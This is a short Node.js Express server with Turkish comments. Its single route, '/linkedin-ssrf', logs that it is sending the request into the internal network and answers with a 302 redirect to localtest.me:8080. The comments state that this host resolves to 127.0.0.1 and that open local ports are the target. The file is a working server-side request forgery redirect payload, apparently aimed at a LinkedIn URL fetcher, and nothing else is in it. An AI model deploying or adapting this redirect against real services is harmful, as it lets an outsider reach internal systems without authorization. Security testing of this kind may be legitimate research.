const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/linkedin-ssrf', (req, res) => {
    console.log('1. İstek geldi, iç ağa yönlendiriliyor...');
    
    // localtest.me 127.0.0.1'e gider. 
    // Açık portlardan biri olan 8080'i veya 80'i hedefliyoruz:
    res.redirect(302, 'http://localtest.me:8080/');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
